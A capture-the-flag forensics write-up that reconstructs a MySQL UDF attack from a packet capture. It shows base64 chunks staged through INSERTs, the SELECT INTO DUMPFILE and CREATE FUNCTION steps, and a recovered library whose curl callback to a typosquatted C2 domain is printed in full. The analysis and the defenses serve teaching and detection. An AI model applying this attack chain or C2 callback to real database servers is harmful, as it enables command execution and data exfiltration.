## Overview

**Endpoint** is an Easy HTB Forensics challenge. You receive a single `capture.pcap` and are asked to find what was sent to the attacker's server. All 757 frames are MySQL protocol — an attacker used chunked `INSERT` statements to stage a malicious ELF shared library inside a database, then embedded the flag as a base64-encoded path in the library's hardcoded C2 callback URL. Two decode steps: reassemble the staged binary, then decode its curl URL path.

---

## The Technique

MySQL's [User-Defined Function (UDF)](https://dev.mysql.com/doc/refman/8.0/en/create-function-loadable.html) mechanism lets an authenticated user load an arbitrary `.so` shared library and call it as a SQL function. The classic attack chain is:

1. Get write access to MySQL (any user with the `FILE` privilege).
2. Deliver a malicious `.so` to the MySQL plugin directory via `SELECT … INTO DUMPFILE`.
3. `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so'` — any SQL now runs OS commands.

The twist in this challenge is **how the `.so` is delivered**: instead of using `LOAD DATA` or file-system access, the attacker base64-encodes the binary, splits it into 60-character chunks, and `INSERT`s each chunk as a row into a throw-away table. The chunks are later reassembled by the database itself. This is a [CWE-506](https://cwe.mitre.org/data/definitions/506.html) (Embedded Malicious Code) delivery pattern — the malicious library never touches the filesystem during transit; it only materialises when `SELECT INTO DUMPFILE` writes the blob.

The recovered `.so` exports a `remote_callback()` function that does nothing but call `curl` against a C2 URL at `files.pypi-install.com` — a typosquatted PyPI-lookalike domain. The "endpoint" of the title is that curl URL, and the flag is its base64-encoded URL path component.

## Solution

### 1. Inspect the PCAP

```bash
tshark -r capture.pcap -q -z io,phs
```

All frames decode as MySQL protocol — no HTTP, no DNS, no TLS. Switch to extracting the query stream:

```bash
tshark -r capture.pcap -Y 'mysql.query' -T fields -e mysql.query
```

The first few queries set the scene:

```
SELECT DATABASE()
DROP TABLE IF EXISTS xQGgYA
CREATE TABLE xQGgYA (qza varchar(255) NOT NULL)
INSERT INTO xQGgYA VALUES ('f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAAFgx...')
INSERT INTO xQGgYA VALUES ('AAAAAAAAAEAAOAALAEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAA...')
...   (321 INSERT rows total)
```

The `f0VMRg==` prefix is `\x7fELF` in base64 — the attacker is staging an ELF binary row by row.

### 2. Reassemble the binary

Create `solve.py`:

```python
#!/usr/bin/env python3
import subprocess, base64, re

PCAP = "files/capture.pcap"

# Extract every MySQL query from the pcap
result = subprocess.run(
    ["tshark", "-r", PCAP, "-Y", "mysql.query", "-T", "fields", "-e", "mysql.query"],
    capture_output=True, text=True
)

# Pull the base64 payload from each INSERT row and join into one string
b64 = "".join(
    re.sub(r"INSERT INTO \S+ VALUES \('([^']+)'\)", r"\1", line).strip()
    for line in result.stdout.splitlines()
    if line.startswith("INSERT")
)

# Decode the joined chunks → ELF shared library
elf_bytes = base64.b64decode(b64)
assert elf_bytes[:4] == b'\x7fELF', "Not an ELF!"

# Find the hardcoded curl C2 URL (printable ASCII range to avoid section padding)
url_match = re.search(rb'curl -s (https?://[\x21-\x7e]+)', elf_bytes)
url = url_match.group(1).decode('ascii')
print(f"[*] C2 URL: {url}")

# The URL path component is the flag, base64-encoded
b64_flag = url.split("/")[-1]
print(f"[+] FLAG: {base64.b64decode(b64_flag).decode()}")
```

```bash
python3 solve.py
```

```
[*] C2 URL: https://files.pypi-install.com/packages/callback/SFRCe2NodW5rNV80bmRfdWRmX2Ywcl9icjM0a2Y0NTd9
[+] FLAG: HTB{...}
```

The library (`lvg6H1g.so`) exports `remote_callback` — the only thing it does is call `curl -s <C2_URL>`. The "payload" exfiltrated to the attacker's server is whatever the URL path component encodes: in this case, the flag.

## Why It Worked

Two root causes:

**1. MySQL FILE privilege + unrestricted `secure_file_priv`** ([CWE-269](https://cwe.mitre.org/data/definitions/269.html)) — the attacker had a MySQL user with `FILE ON *.*`, and `secure_file_priv` wasn't locked to a safe directory, so `SELECT INTO DUMPFILE` could write to the plugin path.

**2. No network egress control** — the UDF could `curl` any external host. If outbound connections from the database host had been restricted to known services, the C2 callback never fires and the flag never leaves.

The chunked INSERT delivery is an evasion technique: individual INSERTs of base64 text look like ordinary application writes in MySQL general logs, unlike a suspicious `LOAD DATA INFILE` or direct file upload.

---

## Fix / Defense

- **Lock `secure_file_priv`** in `my.cnf` to a directory outside the plugin path — `secure_file_priv=/var/lib/mysql-files`. This prevents `SELECT INTO DUMPFILE` from writing binaries to the UDF loader path even if the attacker has `FILE`.
- **Revoke the `FILE` privilege** from all non-root accounts — application users never need it: `REVOKE FILE ON *.* FROM 'app'@'%';`
- **Alert on `CREATE FUNCTION … SONAME`** in MySQL slow/general logs or SIEM rules — UDF loading from an arbitrary `.so` is a critical indicator of compromise.
- **Block or alert on sequential single-column INSERT-of-base64 patterns** — repeated identical-length string INSERTs into a staging table with no matching SELECT is a strong anomaly signal.
- **Restrict outbound network from the DB host** — the exfiltration only succeeds because the host can curl arbitrary domains. Egress allowlisting to known endpoints would have contained the callback.
